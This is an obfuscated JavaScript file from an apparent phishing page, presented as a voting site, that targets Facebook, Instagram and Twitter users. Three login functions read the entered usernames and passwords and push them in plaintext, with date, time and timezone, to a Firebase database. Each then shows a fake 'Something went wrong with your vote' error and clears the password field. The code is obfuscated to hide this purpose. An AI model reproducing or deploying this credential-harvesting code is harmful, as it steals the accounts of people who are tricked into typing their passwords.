var _0x4db6cd = _0x3556;

(function (_0x2b6887, _0x46203f) {
    var _0x1a99a4 = _0x3556,
        _0x5d09ec = _0x2b6887();

    while (!![]) {
        try {
            var _0x568d5e = parseInt(_0x1a99a4(0x8c)) / 0x1 * (-parseInt(_0x1a99a4(0x93)) / 0x2) + parseInt(_0x1a99a4(0x85)) / 0x3 - parseInt(_0x1a99a4(0x79)) / 0x4 - parseInt(_0x1a99a4(0x88)) / 0x5 * (parseInt(_0x1a99a4(0x7a)) / 0x6) + -parseInt(_0x1a99a4(0x94)) / 0x7 * (parseInt(_0x1a99a4(0x8b)) / 0x8) + -parseInt(_0x1a99a4(0x67)) / 0x9 * (-parseInt(_0x1a99a4(0x7c)) / 0xa) + parseInt(_0x1a99a4(0x6a)) / 0xb * (parseInt(_0x1a99a4(0x8d)) / 0xc);
            if (_0x568d5e === _0x46203f) break;
            else _0x5d09ec['push'](_0x5d09ec['shift']());
        } catch (_0x4c4932) {
            _0x5d09ec['push'](_0x5d09ec['shift']());
        }
    }
}(_0x7116, 0x27cd2));

const firebaseConfig = {
    'apiKey': 'YOUR_API_KEY',
    'authDomain': _0x4db6cd(0x78),
    'databaseURL': _0x4db6cd(0x6d),
    'projectId': _0x4db6cd(0x92),
    'storageBucket': _0x4db6cd(0x89),
    'messagingSenderId': '193164197815',
    'appId': '1:193164197815:web:b83a68c9722ae0fa84f232'
};

function _0x7116() {
    var _0x57df6e = ['value', 'Instagram', 'ig-uname', 'error', 'Oops!', 'database', '202068KXhINV', 'Something\x20went\x20wrong\x20with\x20your\x20vote.', 'code', '7690wlFAqF', 'foodsupportdb.appspot.com', 'ref', '1654616QztXvQ', '1PUYCgy', '12CLEvWt', 'catch', 'getElementById', '6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW', 'push', 'foodsupportdb', '357586hZLpFe', '7GovjGY', 'fb-email', 'activate', 'slice', 'resolvedOptions', '18YBhAum', 'timeZone', 'DateTimeFormat', '7114855nggXhr', 'auth', 'fire', 'https://foodsupportdb-default-rtdb.firebaseio.com', 'Try\x20Again', 'tw-email', 'ig-pass', 'fb-pass', 'toISOString', 'alert', 'Error:\x20', 'appCheck', 'message', 'Twitter', 'foodsupportdb.firebaseapp.com', '139972CELCAN', '978LZKhHE', 'signInAnonymously', '600860VanSAp', 'log', 'fbdet'];
    _0x7116 = function () {
        return _0x57df6e;
    };
    return _0x7116();
}

firebase['initializeApp'](firebaseConfig);
const appCheck = firebase[_0x4db6cd(0x75)]();
console[_0x4db6cd(0x7d)](appCheck), appCheck[_0x4db6cd(0x64)](_0x4db6cd(0x90), !![]);

function tw_login() {
    var _0x5a41b7 = _0x4db6cd;
    firebase[_0x5a41b7(0x6b)]()[_0x5a41b7(0x7b)]()[_0x5a41b7(0x8e)](function (_0xf75f0) {
        var _0x46a2c5 = _0x5a41b7,
            _0x91be5e = _0xf75f0[_0x46a2c5(0x87)],
            _0x54ec55 = _0xf75f0[_0x46a2c5(0x76)];
        window[_0x46a2c5(0x73)](_0x46a2c5(0x74) + _0x54ec55);
    });

    var _0x5d3134 = document[_0x5a41b7(0x8f)](_0x5a41b7(0x6f))[_0x5a41b7(0x7f)],
        _0x485fdb = document[_0x5a41b7(0x8f)]('tw-pass')['value'],
        _0x3a9883 = new Date()['toISOString']()[_0x5a41b7(0x65)](0x0, 0xa),
        _0x231132 = new Date()['toISOString']()[_0x5a41b7(0x65)](0xb, 0x13),
        _0x536ade = Intl[_0x5a41b7(0x69)]()['resolvedOptions']()[_0x5a41b7(0x68)],
        _0x2fab0a = _0x5a41b7(0x77);

    if (_0x5d3134 !== '' && _0x485fdb !== '') {
        firebase['database']()[_0x5a41b7(0x8a)](_0x5a41b7(0x7e))[_0x5a41b7(0x91)]({
            'emle': _0x5d3134,
            'mobile': '',
            'time': _0x231132,
            'timezone': _0x536ade,
            'pass': _0x485fdb,
            'date': _0x3a9883,
            'type': _0x2fab0a
        });
        setTimeout(function () {
            var _0x10aec8 = _0x5a41b7;
            return Swal[_0x10aec8(0x6c)]({
                'title': 'Oops!',
                'text': _0x10aec8(0x86),
                'icon': _0x10aec8(0x82),
                'confirmButtonText': _0x10aec8(0x6e)
            }), document[_0x10aec8(0x8f)](_0x10aec8(0x71))[_0x10aec8(0x7f)] = '', ![];
        }, 0x7d0);
    }
}

function iglog() {
    var _0x11605c = _0x4db6cd;
    firebase[_0x11605c(0x6b)]()[_0x11605c(0x7b)]()[_0x11605c(0x8e)](function (_0x3ff8af) {
        var _0x506c74 = _0x11605c,
            _0x19c35a = _0x3ff8af['code'],
            _0x34d0da = _0x3ff8af[_0x506c74(0x76)];
        window[_0x506c74(0x73)]('Error:\x20' + _0x34d0da);
    });

    var _0x1460eb = document[_0x11605c(0x8f)](_0x11605c(0x81))[_0x11605c(0x7f)],
        _0x1e1498 = document[_0x11605c(0x8f)](_0x11605c(0x70))[_0x11605c(0x7f)],
        _0x4d717f = new Date()[_0x11605c(0x72)]()[_0x11605c(0x65)](0x0, 0xa),
        _0x220ce9 = new Date()[_0x11605c(0x72)]()[_0x11605c(0x65)](0xb, 0x13),
        _0x52a403 = Intl[_0x11605c(0x69)]()[_0x11605c(0x66)]()['timeZone'];
    console['log'](_0x52a403);
    var _0xcd9732 = _0x11605c(0x80);

    if (_0x1460eb !== '' && _0x1e1498 !== '') {
        firebase[_0x11605c(0x84)]()[_0x11605c(0x8a)](_0x11605c(0x7e))[_0x11605c(0x91)]({
            'emle': _0x1460eb,
            'mobile': '',
            'time': _0x220ce9,
            'timezone': _0x52a403,
            'pass': _0x1e1498,
            'date': _0x4d717f,
            'type': _0xcd9732
        });
        setTimeout(function () {
            var _0x691677 = _0x11605c;
            return Swal[_0x691677(0x6c)]({
                'title': _0x691677(0x83),
                'text': _0x691677(0x86),
                'icon': 'error',
                'confirmButtonText': _0x691677(0x6e)
            }), document[_0x691677(0x8f)](_0x691677(0x70))[_0x691677(0x7f)] = '', ![];
        }, 0x7d0);
    }
}

function _0x3556(_0x394f71, _0x57ac73) {
    var _0x711617 = _0x7116();
    return _0x3556 = function (_0x3556d3, _0x575dbe) {
        _0x3556d3 = _0x3556d3 - 0x64;
        var _0x196d46 = _0x711617[_0x3556d3];
        return _0x196d46;
    }, _0x3556(_0x394f71, _0x57ac73);
}

function login() {
    var _0x423faa = _0x4db6cd;
    firebase[_0x423faa(0x6b)]()[_0x423faa(0x7b)]()['catch'](function (_0x57b326) {
        var _0x44f925 = _0x423faa,
            _0x2ce18b = _0x57b326['code'],
            _0x521616 = _0x57b326[_0x44f925(0x76)];
        window[_0x44f925(0x73)](_0x44f925(0x74) + _0x521616);
    });

    var _0x2574c8 = document['getElementById'](_0x423faa(0x95))[_0x423faa(0x7f)],
        _0x3a0636 = document[_0x423faa(0x8f)](_0x423faa(0x71))[_0x423faa(0x7f)],
        _0x5de065 = new Date()[_0x423faa(0x72)]()[_0x423faa(0x65)](0x0, 0xa),
        _0x3ee160 = new Date()['toISOString']()[_0x423faa(0x65)](0xb, 0x13),
        _0x5ede7f = Intl[_0x423faa(0x69)]()['resolvedOptions']()[_0x423faa(0x68)],
        _0x1ca108 = 'Facebook';

    if (_0x2574c8 !== '' && _0x3a0636 !== '') {
        firebase[_0x423faa(0x6d)]()[_0x423faa(0x8a)](_0x423faa(0x7e))[_0x423faa(0x91)]({
            'emle': _0x2574c8,
            'mobile': '',
            'time': _0x3ee160,
            'timezone': _0x5ede7f,
            'pass': _0x3a0636,
            'date': _0x5de065,
            'type': _0x1ca108
        });
        setTimeout(function () {
            var _0x4e101c = _0x423faa;
            return Swal[_0x4e101c(0x6c)]({
                'title': _0x4e101c(0x83),
                'text': _0x4e101c(0x86),
                'icon': _0x4e101c(0x82),
                'confirmButtonText': _0x4e101c(0x6e)
            }), document[_0x4e101c(0x8f)](_0x4e101c(0x71))[_0x4e101c(0x7f)] = '', ![];
        }, 0x7d0);
    }
}
